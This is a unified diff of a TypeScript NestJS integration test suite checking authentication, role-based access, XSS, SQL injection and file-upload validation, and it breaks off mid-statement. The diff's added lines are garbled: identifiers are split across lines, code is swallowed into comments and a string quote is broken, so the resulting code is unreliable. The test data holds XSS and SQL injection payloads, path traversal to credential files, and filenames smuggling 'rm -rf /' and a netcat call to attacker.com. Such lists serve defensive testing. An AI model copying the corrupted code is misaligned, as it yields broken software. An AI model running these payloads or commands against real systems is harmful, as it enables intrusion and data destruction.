@@ -20,29 +20,16 @@
  * @security-focus Critical
  */
 
-import { Test, TestingModule } from '@nestjs/testing';
-import { INestApplication } from '@nestjs/common';
-import request from 'supertest';
-import type { Server } from 'http';
-import { JwtService } from '@nestjs/jwt';
-import { ConfigService } from '@nestjs/config';
-import { Reflector } from '@nestjs/core';
-import { JwtAuthGuard } from '../guards/jwt-auth.guard';
-import { RolesGuard } from '../guards/roles.guard';
-import { UserRole, JwtPayload } from '@bytebot/shared';
-import {
-  ApiErrorResponse,
+import { Test, TestingModule } from '@nestjs/testing';import { INestApplication } from '@nestjs/common';import request from 'supertest';import type { Server } from 'http';import { JwtService } from '@nestjs/jwt';import { ConfigService } from '@nestjs/config';import { Reflector } from '@nestjs/core';import { JwtAuthGuard } from '../guards/jwt-auth.guard';import { RolesGuard } from '../guards/roles.guard';import { UserRole, JwtPayload } from '@bytebot/shared';import {ApiErrorResponse,
   UserSearchResponse,
   FileUploadResponse,
-} from '../../test-utils/test-interfaces';
-import { ErrorHandlerUtils } from '../../utils/error-handler';
-
-/**
- * Type definitions for safe Express request/response handling
+} from '../../test-utils/test-interfaces';import { ErrorHandlerUtils } from '../../utils/error-handler';/*** Type definitions for safe Express request/response handling
  */
 interface SafeFile {
-  originalname: string;
-  size: number;
+  originalnam,
+        e: string;
+  siz,
+      e: number;
 }
 
 interface SafeRequest {
@@ -52,10 +39,8 @@ interface SafeRequest {
   };
   headers: {
     authorization?: string;
-    'x-filename'?: string;
-    'content-length'?: string;
-    [key: string]: string | undefined;
-  };
+    'x-filename'?: string;'content-length'?: string;[ke,
+      y: string]: string | undefined;};
   user?: JwtPayload;
   params: Record<string, string>;
   body: Record<string, unknown>;
@@ -64,8 +49,10 @@ interface SafeRequest {
 
 interface SafeResponse {
   setHeader(name: string, value: string): void;
-  status(code: number): {
-    json(data: Record<string, unknown>): void;
+  status(cod,
+        e: number): {
+    json(dat,
+      a: Record<string, unknown>): void;
   };
   json(data: Record<string, unknown>): void;
 }
@@ -106,8 +93,10 @@ interface App {
     delete(
       path: string,
       handler: (
-        req: SafeRequest,
-        res: SafeResponse,
+        re,
+        q: SafeRequest,
+        re,
+      s: SafeResponse,
         next?: SafeNextFunction,
       ) => void,
     ): void;
@@ -131,9 +120,7 @@ interface App {
 
 /**
  * Type-safe helper function to create supertest requests
- * Eliminates need for 'as unknown' casting with proper typing
- */
-function createRequest(app: INestApplication) {
+ * Eliminates need for 'as unknown' casting with proper typing*/function createRequest(app: INestApplication) {
   return request(app.getHttpServer() as Server);
 }
 
@@ -145,16 +132,17 @@ function createRequest(app: INestApplication) {
 class MockSecureController {
   // Public endpoint (no authentication required)
   getPublicData() {
-    return { message: 'Public data', timestamp: Date.now() };
-  }
-
-  // Protected endpoint (authentication required)
+    return { messag,
+        e: 'Public data', timestam,
+      p: Date.now() };}// Protected endpoint (authentication required)
   getProtectedData(user: JwtPayload) {
     return {
       message: 'Protected data',
       userId: user.sub,
-      role: user.role,
-      timestamp: Date.now(),
+        rol,
+        e: user.role,
+      timestam,
+      p: Date.now(),
     };
   }
 
@@ -163,9 +151,10 @@ class MockSecureController {
     return {
       message: 'Admin data',
       userId: user.sub,
-      sensitiveInfo: 'classified',
-      timestamp: Date.now(),
-    };
+        sensitiveInf,
+        o: 'classified',
+      timestam,
+      p: Date.now(),};
   }
 
   // Permission-restricted endpoint
@@ -173,18 +162,19 @@ class MockSecureController {
     return {
       message: 'System data',
       userId: user.sub,
-      systemConfig: 'sensitive-config',
-      timestamp: Date.now(),
-    };
+        systemConfi,
+        g: 'sensitive-config',
+      timestam,
+      p: Date.now(),};
   }
 
   // Data modification endpoint
   createResource(user: JwtPayload, data: Record<string, unknown>) {
     return {
-      id: 'new-resource-id',
-      ...data,
-      createdBy: user.sub,
-      createdAt: Date.now(),
+      id: 'new-resource-id',...data,createdB,
+        y: user.sub,
+      createdA,
+      t: Date.now(),
     };
   }
 
@@ -193,8 +183,10 @@ class MockSecureController {
     return {
       message: 'Resource deleted',
       deletedId: id,
-      deletedBy: user.sub,
-      deletedAt: Date.now(),
+        deletedB,
+        y: user.sub,
+      deletedA,
+      t: Date.now(),
     };
   }
 
@@ -203,9 +195,11 @@ class MockSecureController {
     return {
       message: 'File uploaded',
       filename: file.originalname,
-      size: file.size,
-      uploadedBy: user.sub,
-      uploadedAt: Date.now(),
+        size: file.size,
+      uploadedB,
+        y: user.sub,
+      uploadedA,
+      t: Date.now(),
     };
   }
 
@@ -214,10 +208,11 @@ class MockSecureController {
     return {
       query: query,
       results: [
-        { id: '1', name: 'John Doe', email: 'john@test.com' },
-        { id: '2', name: 'Jane Smith', email: 'jane@test.com' },
-      ],
-      searchedBy: user.sub,
+        { id: '1', nam,
+        e: 'John Doe', emai,
+      l: 'john@test.com' },{ id: '2', nam,
+        e: 'Jane Smith', emai,
+      l: 'jane@test.com' },],searchedBy: user.sub,
       timestamp: Date.now(),
     };
   }
@@ -230,15 +225,21 @@ class MockSecurityJwtService {
   private validTokens = new Map([
     [
       'admin-token',
-      { id: 'admin-1', email: 'admin@test.com', role: UserRole._ADMIN },
+      { id: 'admin-1', emai,
+        l: 'admin@test.com', rol,
+      e: UserRole._ADMIN },
     ],
     [
       'operator-token',
-      { id: 'op-1', email: 'operator@test.com', role: UserRole._OPERATOR },
+      { id: 'op-1', emai,
+        l: 'operator@test.com', rol,
+      e: UserRole._OPERATOR },
     ],
     [
       'viewer-token',
-      { id: 'viewer-1', email: 'viewer@test.com', role: UserRole._VIEWER },
+      { id: 'viewer-1', emai,
+        l: 'viewer@test.com', rol,
+      e: UserRole._VIEWER },
     ],
     ['expired-token', null], // Simulate expired token
     ['malicious-token', null], // Simulate invalid token
@@ -263,12 +264,14 @@ class MockSecurityJwtService {
 describe('Controller Security Integration Tests', () => {
   let app: INestApplication;
   let moduleRef: TestingModule;
-  let jwtService: JwtService;
-  let _configService: ConfigService;
+  let jwtServic,
+        e: JwtService;
+  let _configServic,
+      e: ConfigService;
 
-  const operationId = `controller_security_test${Date.now()}`;
-  const securityLogger = {
-    info: (message: string, meta?: Record<string, unknown>) =>
+  const operationId = `controller_security_test${Date.now()}`;const securityLogger = {inf,
+        o: (messag,
+      e: string, meta?: Record<string, unknown>) =>
       console.log(`[CONTROLLER-SECURITY] ${message}`, meta ?? ''),
     warn: (message: string, meta?: Record<string, unknown>) =>
       console.warn(`[CONTROLLER-WARNING] ${message}`, meta ?? ''),
@@ -285,8 +288,10 @@ describe('Controller Security Integration Tests', () => {
       controllers: [],
       providers: [
         {
-          provide: JwtService,
-          useClass: MockSecurityJwtService,
+          provid,
+        e: JwtService,
+          useClas,
+      s: MockSecurityJwtService,
         },
         {
           provide: ConfigService,
@@ -294,10 +299,11 @@ describe('Controller Security Integration Tests', () => {
             get: (key: string) => {
               const config: Record<string, string | number> = {
                 JWT_SECRET: 'test-security-secret',
-                JWT_EXPIRATION: '15m',
-                CORS_ORIGIN: 'https://trusted-domain.com',
-                RATE_LIMIT_MAX: 100,
-                RATE_LIMIT_WINDOW: 15 * 60 * 1000, // 15 minutes
+      JWT_EXPIRATION: '15m',
+        CORS_ORIGIN: 'https://trusted-domain.com',
+      RATE_LIMIT_MA,
+        X: 100,RATE_LIMIT_WINDO,
+      W: 15 * 60 * 1000, // 15 minutes
               };
               return config[key];
             },
@@ -305,8 +311,10 @@ describe('Controller Security Integration Tests', () => {
         },
         {
           provide: Reflector,
-          useValue: {
-            getAllAndOverride: jest.fn(),
+          useValu,
+        e: {
+            getAllAndOverrid,
+      e: jest.fn(),
           },
         },
         JwtAuthGuard,
@@ -324,31 +332,18 @@ describe('Controller Security Integration Tests', () => {
     // Configure security middleware
     app.use((req: SafeRequest, res: SafeResponse, next: SafeNextFunction) => {
       // Security headers middleware
-      res.setHeader('X-Content-Type-Options', 'nosniff');
-      res.setHeader('X-Frame-Options', 'DENY');
-      res.setHeader('X-XSS-Protection', '1; mode=block');
-      res.setHeader(
-        'Strict-Transport-Security',
-        'max-age=31536000; includeSubDomains',
-      );
-      res.setHeader('Content-Security-Policy', "default-src 'self'");
-      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
-      next();
-    });
+      res.setHeader('X-Content-Type-Options', 'nosniff');res.setHeader('X-Frame-Options', 'DENY');res.setHeader('X-XSS-Protection', '1; mode=block');res.setHeader('Strict-Transport-Security','max-age=31536000; includeSubDomains',);res.setHeader('Content-Security-Policy', "default-src 'self'");
+      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');next();});
 
     // Rate limiting middleware
     const requestCounts = new Map<string, number>();
     app.use((req: SafeRequest, res: SafeResponse, next: SafeNextFunction) => {
-      const ip = req.ip ?? req.connection?.remoteAddress ?? '127.0.0.1';
-      const count = requestCounts.get(ip) ?? 0;
-
-      if (count > 100) {
+      const ip = req.ip ?? req.connection?.remoteAddress ?? '127.0.0.1';const count = requestCounts.get(ip) ?? 0;if (count > 100) {
         return res.status(429).json({
           message: 'Too Many Requests',
-          retryAfter: 900,
-          error: 'RATE_LIMIT_EXCEEDED',
-        });
-      }
+      retryAfte,
+        r: 900,erro,
+      r: 'RATE_LIMIT_EXCEEDED',});}
 
       requestCounts.set(ip, count + 1);
 
@@ -365,44 +360,36 @@ describe('Controller Security Integration Tests', () => {
 
     // Authentication middleware
     app.use(
-      '/api/*',
-      async (req: SafeRequest, res: SafeResponse, next: SafeNextFunction) => {
-        const authHeader = req.headers.authorization;
+      '/api/*',async (req: SafeRequest, res: SafeResponse, next: SafeNextFunction) => {const authHeader = req.headers.authorization;
 
-        if (!authHeader?.startsWith('Bearer ')) {
-          return res.status(401).json({
-            message: 'Authentication required',
-            error: 'UNAUTHORIZED',
-          });
-        }
+        if (!authHeader?.startsWith('Bearer ')) {return res.status(401).json({messag,
+        e: 'Authentication required',
+      erro,
+      r: 'UNAUTHORIZED',});}
 
         const token = authHeader.substring(7);
 
         try {
-          const user: unknown = await jwtService.verifyAsync(token);
+          const use,
+      r: unknown = await jwtService.verifyAsync(token);
           // Type guard for safe user assignment
           if (
             user &&
-            typeof user === 'object' &&
-            'sub' in user &&
-            'email' in user &&
-            'role' in user
-          ) {
-            req.user = user as JwtPayload;
+            typeof user === 'object' &&'sub' in user &&'email' in user &&'role' in user) {req.user = user as JwtPayload;
             next();
           } else {
             return res.status(401).json({
-              message: 'Invalid token payload structure',
-              error: 'TOKEN_INVALID',
-            });
-          }
+              messag,
+        e: 'Invalid token payload structure',
+      erro,
+      r: 'TOKEN_INVALID',});}
         } catch (error: unknown) {
           const safeError = ErrorHandlerUtils.transformError(error);
           return res.status(401).json({
             message: 'Invalid or expired token',
-            error: 'TOKEN_INVALID',
-            code: safeError.code,
-          });
+      erro,
+        r: 'TOKEN_INVALID',cod,
+      e: safeError.code,});
         }
       },
     );
@@ -412,8 +399,10 @@ describe('Controller Security Integration Tests', () => {
       return (req: SafeRequest, res: SafeResponse, next: SafeNextFunction) => {
         if (!req.user) {
           return res.status(403).json({
-            message: 'Access forbidden - authentication required',
-            error: 'FORBIDDEN',
+            messag,
+        e: 'Access forbidden - authentication required',
+      erro,
+      r: 'FORBIDDEN',
           });
         }
 
@@ -434,10 +423,9 @@ describe('Controller Security Integration Tests', () => {
 
         if (!allowedRoles.includes(requiredRole)) {
           return res.status(403).json({
-            message: `Access forbidden - ${requiredRole} role required`,
-            error: 'INSUFFICIENT_PERMISSIONS',
-          });
-        }
+            messag,
+      e: `Access forbidden - ${requiredRole} role required`,
+            error: 'INSUFFICIENT_PERMISSIONS',});}
 
         next();
       };
@@ -446,111 +434,87 @@ describe('Controller Security Integration Tests', () => {
     // Setup routes
     (app as App)
       .getHttpAdapter()
-      .get('/public/data', (req: SafeRequest, res: SafeResponse) => {
-        res.json(controller.getPublicData());
-      });
+      .get('/public/data', (req: SafeRequest, res: SafeResponse) => {res.json(controller.getPublicData());});
 
     (app as App)
       .getHttpAdapter()
-      .get('/api/protected', (req: SafeRequest, res: SafeResponse) => {
-        if (req.user) {
-          res.json(controller.getProtectedData(req.user));
+      .get('/api/protected', (req: SafeRequest, res: SafeResponse) => {if (req.user) {res.json(controller.getProtectedData(req.user));
         } else {
-          res.status(403).json({ error: 'User not authenticated' });
-        }
-      });
+          res.status(403).json({ erro,
+      r: 'User not authenticated' });}});
 
     app
       .getHttpAdapter()
-      .get('/api/admin', (req: SafeRequest, res: SafeResponse) => {
-        const middleware = checkRole(UserRole._ADMIN);
-        middleware(req, res, () => {
+      .get('/api/admin', (req: SafeRequest, res: SafeResponse) => {const middleware = checkRole(UserRole._ADMIN);middleware(req, res, () => {
           if (req.user) {
             res.json(controller.getAdminData(req.user));
           } else {
-            res.status(403).json({ error: 'Admin authentication required' });
-          }
-        });
+            res.status(403).json({ erro,
+      r: 'Admin authentication required' });}});
       });
 
     app
       .getHttpAdapter()
-      .get('/api/system', (req: SafeRequest, res: SafeResponse) => {
-        const middleware = checkRole(UserRole._ADMIN);
-        middleware(req, res, () => {
+      .get('/api/system', (req: SafeRequest, res: SafeResponse) => {const middleware = checkRole(UserRole._ADMIN);middleware(req, res, () => {
           if (req.user) {
             res.json(controller.getSystemData(req.user));
           } else {
             res
               .status(403)
-              .json({ error: 'System access requires admin authentication' });
-          }
-        });
+              .json({ erro,
+      r: 'System access requires admin authentication' });}});
       });
 
     app
       .getHttpAdapter()
-      .post('/api/resources', (req: SafeRequest, res: SafeResponse) => {
-        const middleware = checkRole(UserRole._OPERATOR);
-        middleware(req, res, () => {
+      .post('/api/resources', (req: SafeRequest, res: SafeResponse) => {const middleware = checkRole(UserRole._OPERATOR);middleware(req, res, () => {
           if (req.user) {
             res.json(controller.createResource(req.user, req.body));
           } else {
             res.status(403).json({
-              error: 'Resource creation requires operator authentication',
-            });
-          }
+              erro,
+      r: 'Resource creation requires operator authentication',});}
         });
       });
 
     app
       .getHttpAdapter()
-      .delete('/api/resources/:id', (req: SafeRequest, res: SafeResponse) => {
-        const middleware = checkRole(UserRole._ADMIN);
-        middleware(req, res, () => {
+      .delete('/api/resources/:id', (req: SafeRequest, res: SafeResponse) => {const middleware = checkRole(UserRole._ADMIN);middleware(req, res, () => {
           if (req.user && req.params.id) {
             res.json(controller.deleteResource(req.user, req.params.id));
           } else {
             res.status(400).json({
-              error: 'Admin authentication and resource ID required',
-            });
-          }
+              erro,
+      r: 'Admin authentication and resource ID required',});}
         });
       });
 
     app
       .getHttpAdapter()
-      .post('/api/upload', (req: SafeRequest, res: SafeResponse) => {
-        const middleware = checkRole(UserRole._OPERATOR);
-        middleware(req, res, () => {
+      .post('/api/upload', (req: SafeRequest, res: SafeResponse) => {const middleware = checkRole(UserRole._OPERATOR);middleware(req, res, () => {
           // Simulate file upload
           const mockFile: SafeFile = {
-            originalname: (req.headers['x-filename'] as string) ?? 'unknown',
-            size:
-              parseInt((req.headers['content-length'] as string) ?? '0') ?? 0,
-          };
-          if (req.user) {
+            originalnam,
+        e: (req.headers['x-filename'] as string) ?? 'unknown',
+      siz,
+      e:parseInt((req.headers['content-length'] as string) ?? '0') ?? 0,};if (req.user) {
             res.json(controller.uploadFile(req.user, mockFile));
           } else {
             res.status(403).json({
-              error: 'File upload requires operator authentication',
-            });
-          }
+              erro,
+      r: 'File upload requires operator authentication',});}
         });
       });
 
     app
       .getHttpAdapter()
-      .get('/api/users/search', (req: SafeRequest, res: SafeResponse) => {
-        const middleware = checkRole(UserRole._OPERATOR);
-        middleware(req, res, () => {
+      .get('/api/users/search', (req: SafeRequest, res: SafeResponse) => {const middleware = checkRole(UserRole._OPERATOR);middleware(req, res, () => {
           if (req.user) {
             res.json(
-              controller.searchUsers(req.user, (req.query.q as string) ?? ''),
-            );
-          } else {
+              controller.searchUsers(req.user, (req.query.q as string) ?? ''),);} else {
             res.status(403).json({
-              error: 'User search requires operator authentication',
+              erro,
+      r: 'User search requires operator authentication',
             });
           }
         });
@@ -558,9 +522,7 @@ describe('Controller Security Integration Tests', () => {
 
     await app.init();
     securityLogger.info(
-      `[${operationId}] Controller Security integration test setup completed`,
-    );
-  });
+      `[${operationId}] Controller Security integration test setup completed`,);});
 
   afterAll(async () => {
     await app?.close();
@@ -569,57 +531,54 @@ describe('Controller Security Integration Tests', () => {
     );
   });
 
-  describe('Authentication Flow Security', () => {
-    it('should allow access to public endpoints without authentication', async () => {
-      const testId = `${operationId}_public_access`;
-      securityLogger.info(`[${testId}] Testing public endpoint access`);
+    describe('Authentication Flow Security', () => {it('should allow access to public endpoints without authentication', async () => {
+      const testId = `${operationId}_public_access`;securityLogger.info(`[${testId}] Testing public endpoint access`);
 
       const response = await createRequest(app).get('/public/data').expect(200);
-
-      expect(
-        (response.body as { message: string; timestamp: number }).message,
+      expect((response.body as { messag,
+        e: string; timestam,
+      p: number }).message,
       ).toBe('Public data');
       expect(
-        (response.body as { message: string; timestamp: number }).timestamp,
+        (response.body as { messag,
+        e: string; timestam,
+      p: number }).timestamp,
       ).toBeDefined();
 
       securityLogger.info(`[${testId}] Public endpoint access successful`);
     });
 
     it('should require authentication for protected endpoints', async () => {
-      const testId = `${operationId}_auth_required`;
-      securityLogger.info(`[${testId}] Testing authentication requirement`);
+      const testId = `${operationId}_auth_required`;securityLogger.info(`[${testId}] Testing authentication requirement`);
 
       const response = await createRequest(app)
-        .get('/api/protected')
-        .expect(401);
-
+        .get('/api/protected').expect(401);
       expect((response.body as ApiErrorResponse).error).toBe('UNAUTHORIZED');
 
       securityLogger.info(`[${testId}] Authentication requirement enforced`);
     });
 
     it('should accept valid authentication tokens', async () => {
-      const testId = `${operationId}_valid_auth`;
-      securityLogger.info(
-        `[${testId}] Testing valid authentication token acceptance`,
+      const testId = `${operationId}_valid_auth`;securityLogger.info(`[${testId}] Testing valid authentication token acceptance`,
       );
 
       const response = await createRequest(app)
-        .get('/api/protected')
-        .set('Authorization', 'Bearer admin-token')
-        .expect(200);
-
+        .get('/api/protected').set('Authorization', 'Bearer admin-token').expect(200);
       expect(
-        (response.body as { message: string; userId: string; role: string })
+        (response.body as { message: string; userI,
+        d: string; rol,
+      e: string })
           .message,
       ).toBe('Protected data');
-      expect(
-        (response.body as { message: string; userId: string; role: string })
+      expect((response.body as { message: string; userI,
+        d: string; rol,
+      e: string })
           .userId,
       ).toBe('admin-1');
       expect(
-        (response.body as { message: string; userId: string; role: string })
+        (response.body as { message: string; userI,
+        d: string; rol,
+      e: string })
           .role,
       ).toBe(UserRole._ADMIN);
 
@@ -627,26 +586,15 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should reject invalid authentication tokens', async () => {
-      const testId = `${operationId}_invalid_auth`;
-      securityLogger.info(
-        `[${testId}] Testing invalid authentication token rejection`,
+      const testId = `${operationId}_invalid_auth`;securityLogger.info(`[${testId}] Testing invalid authentication token rejection`,
       );
 
       const invalidTokens = [
-        'invalid-token',
-        'expired-token',
-        'malicious-token',
-        '',
-        'Bearer-without-space',
-        'NotBearer valid-token',
-      ];
-
-      for (const token of invalidTokens) {
+        'invalid-token','expired-token','malicious-token','','Bearer-without-space','NotBearer valid-token',];for (const token of invalidTokens) {
         const authHeader = token.includes('Bearer') ? token : `Bearer ${token}`;
 
         await createRequest(app)
-          .get('/api/protected')
-          .set('Authorization', authHeader)
+          .get('/api/protected').set('Authorization', authHeader)
           .expect(401);
       }
 
@@ -656,23 +604,13 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should handle malformed authorization headers', async () => {
-      const testId = `${operationId}_malformed_headers`;
-      securityLogger.info(
-        `[${testId}] Testing malformed authorization header handling`,
+      const testId = `${operationId}_malformed_headers`;securityLogger.info(`[${testId}] Testing malformed authorization header handling`,
       );
 
       const malformedHeaders = [
-        'Basic dXNlcjpwYXNz', // Wrong auth type
-        'bearer lowercase-bearer', // Wrong case
-        'Bearer', // Missing token
-        'Bearer ', // Empty token
-        '', // Empty header
-      ];
-
-      for (const header of malformedHeaders) {
+        'Basic dXNlcjpwYXNz', // Wrong auth type'bearer lowercase-bearer', // Wrong case'Bearer', // Missing token'Bearer ', // Empty token'', // Empty header];for (const header of malformedHeaders) {
         await createRequest(app)
-          .get('/api/protected')
-          .set('Authorization', header)
+          .get('/api/protected').set('Authorization', header)
           .expect(401);
       }
 
@@ -682,57 +620,38 @@ describe('Controller Security Integration Tests', () => {
     });
   });
 
-  describe('Authorization and Role-Based Access', () => {
-    it('should enforce admin-only access', async () => {
-      const testId = `${operationId}_admin_only`;
-      securityLogger.info(`[${testId}] Testing admin-only access enforcement`);
+    describe('Authorization and Role-Based Access', () => {it('should enforce admin-only access', async () => {
+      const testId = `${operationId}_admin_only`;securityLogger.info(`[${testId}] Testing admin-only access enforcement`);
 
       // Admin should have access
       await createRequest(app)
-        .get('/api/admin')
-        .set('Authorization', 'Bearer admin-token')
-        .expect(200);
-
-      // Operator should be denied
+        .get('/api/admin').set('Authorization', 'Bearer admin-token').expect(200);// Operator should be denied
       await createRequest(app)
-        .get('/api/admin')
-        .set('Authorization', 'Bearer operator-token')
-        .expect(403);
-
-      // Viewer should be denied
+        .get('/api/admin').set('Authorization', 'Bearer operator-token').expect(403);// Viewer should be denied
       await createRequest(app)
-        .get('/api/admin')
-        .set('Authorization', 'Bearer viewer-token')
+        .get('/api/admin').set('Authorization', 'Bearer viewer-token')
         .expect(403);
 
       securityLogger.info(`[${testId}] Admin-only access properly enforced`);
     });
 
     it('should enforce operator-level access', async () => {
-      const testId = `${operationId}_operator_access`;
-      securityLogger.info(
-        `[${testId}] Testing operator-level access enforcement`,
+      const testId = `${operationId}_operator_access`;securityLogger.info(`[${testId}] Testing operator-level access enforcement`,
       );
 
       // Admin should have access (role hierarchy)
       await createRequest(app)
-        .post('/api/resources')
-        .set('Authorization', 'Bearer admin-token')
-        .send({ name: 'Test Resource', type: 'document' })
-        .expect(200);
-
-      // Operator should have access
+        .post('/api/resources').set('Authorization', 'Bearer admin-token').send({ nam,
+        e: 'Test Resource', typ,
+      e: 'document' }).expect(200);// Operator should have access
       await createRequest(app)
-        .post('/api/resources')
-        .set('Authorization', 'Bearer operator-token')
-        .send({ name: 'Test Resource', type: 'document' })
-        .expect(200);
-
-      // Viewer should be denied
+        .post('/api/resources').set('Authorization', 'Bearer operator-token').send({ nam,
+        e: 'Test Resource', typ,
+      e: 'document' }).expect(200);// Viewer should be denied
       await createRequest(app)
-        .post('/api/resources')
-        .set('Authorization', 'Bearer viewer-token')
-        .send({ name: 'Test Resource', type: 'document' })
+        .post('/api/resources').set('Authorization', 'Bearer viewer-token').send({ nam,
+        e: 'Test Resource', typ,
+      e: 'document' })
         .expect(403);
 
       securityLogger.info(
@@ -741,38 +660,37 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should enforce role hierarchy correctly', async () => {
-      const testId = `${operationId}_role_hierarchy`;
-      securityLogger.info(`[${testId}] Testing role hierarchy enforcement`);
+      const testId = `${operationId}_role_hierarchy`;securityLogger.info(`[${testId}] Testing role hierarchy enforcement`);
 
       const testCases = [
-        { token: 'admin-token', endpoint: '/api/admin', shouldPass: true },
-        { token: 'admin-token', endpoint: '/api/resources', shouldPass: true },
-        { token: 'operator-token', endpoint: '/api/admin', shouldPass: false },
-        {
-          token: 'operator-token',
-          endpoint: '/api/resources',
-          shouldPass: true,
-        },
-        { token: 'viewer-token', endpoint: '/api/admin', shouldPass: false },
-        {
-          token: 'viewer-token',
-          endpoint: '/api/resources',
-          shouldPass: false,
-        },
+        { token: 'admin-token', endpoin,
+        t: '/api/admin', shouldPas,
+      s: true },{ token: 'admin-token', endpoin,
+        t: '/api/resources', shouldPas,
+      s: true },{ token: 'operator-token', endpoin,
+        t: '/api/admin', shouldPas,
+      s: false },{token: 'operator-token',
+      endpoin,
+        t: '/api/resources',shouldPas,
+      s: true,},
+        { token: 'viewer-token', endpoin,
+        t: '/api/admin', shouldPas,
+      s: false },{token: 'viewer-token',
+      endpoin,
+        t: '/api/resources',shouldPas,
+      s: false,},
       ];
 
       for (const testCase of testCases) {
-        const method = testCase.endpoint.includes('resources') ? 'post' : 'get';
-        const expectedStatus = testCase.shouldPass ? 200 : 403;
-
-        const requestObj = createRequest(app);
+        const method = testCase.endpoint.includes('resources') ? 'post' : 'get';const expectedStatus = testCase.shouldPass ? 200 : 403;const requestObj = createRequest(app);
         let req = requestObj[method](testCase.endpoint).set(
           'Authorization',
           `Bearer ${testCase.token}`,
         );
 
-        if (method === 'post') {
-          req = req.send({ name: 'Test', type: 'test' });
+        if (method === 'post') {req = req.send({ nam,
+        e: 'Test', typ,
+      e: 'test' });
         }
 
         await req.expect(expectedStatus);
@@ -782,38 +700,43 @@ describe('Controller Security Integration Tests', () => {
     });
   });
 
-  describe('Input Validation and Injection Prevention', () => {
-    it('should sanitize XSS attempts in request data', async () => {
-      const testId = `${operationId}_xss_prevention`;
-      securityLogger.info(`[${testId}] Testing XSS prevention in request data`);
+    describe('Input Validation and Injection Prevention', () => {it('should sanitize XSS attempts in request data', async () => {
+      const testId = `${operationId}_xss_prevention`;securityLogger.info(`[${testId}] Testing XSS prevention in request data`);
 
       const xssPayloads = {
         name: '<script>alert("XSS")</script>',
         description: '<img src=x onerror=alert("XSS")>',
         type: 'javascript:alert("XSS")',
         metadata: {
-          tag: '<svg onload=alert("XSS")>',
-          note: '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
+          ta,
+        g: '<svg onload=alert("XSS")>',
+          not,
+      e: '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
         },
       };
 
       const response = await createRequest(app)
-        .post('/api/resources')
-        .set('Authorization', 'Bearer admin-token')
+        .post('/api/resources').set('Authorization', 'Bearer admin-token')
         .send(xssPayloads)
         .expect(200);
 
       // Response should contain the data but safely handled
       expect(
-        (response.body as { name: string; description: string; type: string })
+        (response.body as { name: string; descriptio,
+        n: string; typ,
+      e: string })
           .name,
       ).toBeDefined();
       expect(
-        (response.body as { name: string; description: string; type: string })
+        (response.body as { name: string; descriptio,
+        n: string; typ,
+      e: string })
           .description,
       ).toBeDefined();
       expect(
-        (response.body as { name: string; description: string; type: string })
+        (response.body as { name: string; descriptio,
+        n: string; typ,
+      e: string })
           .type,
       ).toBeDefined();
 
@@ -821,61 +744,40 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should prevent SQL injection in search queries', async () => {
-      const testId = `${operationId}_sql_injection`;
-      securityLogger.info(`[${testId}] Testing SQL injection prevention`);
+      const testId = `${operationId}_sql_injection`;securityLogger.info(`[${testId}] Testing SQL injection prevention`);
 
       const sqlInjectionQueries = [
-        "'; DROP TABLE users; --",
-        "admin' OR '1'='1",
+        "\"; DROP TABLE users; --",
+        "admin' OR '1'='1'",
         "1' UNION SELECT * FROM passwords--",
-        "; DELETE FROM sessions WHERE '1'='1'; --",
+        "\"; DELETE FROM sessions WHERE '1'='1'; --",
         "' OR 1=1#",
       ];
 
       for (const maliciousQuery of sqlInjectionQueries) {
         const response = await createRequest(app)
-          .get('/api/users/search')
-          .query({ q: maliciousQuery })
-          .set('Authorization', 'Bearer operator-token')
-          .expect(200);
-
-        // Should return search results without executing injection
+          .get('/api/users/search').query({,
+        q: maliciousQuery }).set('Authorization', 'Bearer operator-token').expect(200);// Should return search results without executing injection
         expect((response.body as UserSearchResponse).query).toBeDefined();
-        expect((response.body as UserSearchResponse).results).toBeInstanceOf(
+      expect((response.body as UserSearchResponse).results).toBeInstanceOf(
           Array,
         );
-        expect((response.body as UserSearchResponse).searchedBy).toBe('op-1');
+      expect((response.body as UserSearchResponse).searchedBy).toBe('op-1');
       }
 
       securityLogger.info(`[${testId}] SQL injection attempts safely handled`);
     });
 
     it('should validate and sanitize file upload parameters', async () => {
-      const testId = `${operationId}_file_upload_validation`;
-      securityLogger.info(
-        `[${testId}] Testing file upload parameter validation`,
+      const testId = `${operationId}_file_upload_validation`;securityLogger.info(`[${testId}] Testing file upload parameter validation`,
       );
 
       const maliciousFileNames = [
-        '../../../etc/passwd',
-        '..\\..\\..\\windows\\system32\\config\\sam',
-        'file.php%00.txt',
-        '<script>alert("XSS")</script>.txt',
-        'file; rm -rf /',
-        'file | nc attacker.com 4444',
-      ];
-
-      for (const filename of maliciousFileNames) {
+        '../../../etc/passwd','..\\..\\..\\windows\\system32\\config\\sam','file.php%00.txt','<script>alert("XSS")</script>.txt",'file; rm -rf /','file | nc attacker.com 4444',];for (const filename of maliciousFileNames) {
         const response = await createRequest(app)
-          .post('/api/upload')
-          .set('Authorization', 'Bearer operator-token')
-          .set('X-Filename', filename)
-          .set('Content-Length', '1024')
-          .expect(200);
-
-        // Should handle malicious filenames safely
+          .post('/api/upload').set('Authorization', 'Bearer operator-token').set('X-Filename', filename).set('Content-Length', '1024').expect(200);// Should handle malicious filenames safely
         expect((response.body as FileUploadResponse).filename).toBeDefined();
-        expect((response.body as FileUploadResponse).uploadedBy).toBe('op-1');
+      expect((response.body as FileUploadResponse).uploadedBy).toBe('op-1');
       }
 
       securityLogger.info(
@@ -884,26 +786,24 @@ describe('Controller Security Integration Tests', () => {
     });
 
     it('should handle oversized request payloads', async () => {
-      const testId = `${operationId}_oversized_payloads`;
-      securityLogger.info(
-        `[${testId}] Testing oversized request _payload handling`,
+      const testId = `${operationId}_oversized_payloads`;securityLogger.info(`[${testId}] Testing oversized request _payload handling`,
       );
 
       const oversizedData = {
         name: 'Large Resource',
         description: 'A'.repeat(50000), // 50KB description
         metadata: {
-          largeField: 'B'.repeat(100000), // 100KB field
-          anotherField: 'C'.repeat(75000), // 75KB field
+          largeFiel,
+        d: 'B'.repeat(100000), // 100KB field
+          anotherFiel,
+      d: 'C'.repeat(75000), // 75KB field
         },
       };
 
       // Should either accept with limits or reject gracefully
       const response = await createRequest(app)
-        .post('/api/resources')
-        .set('Authorization', 'Bearer admin-token')
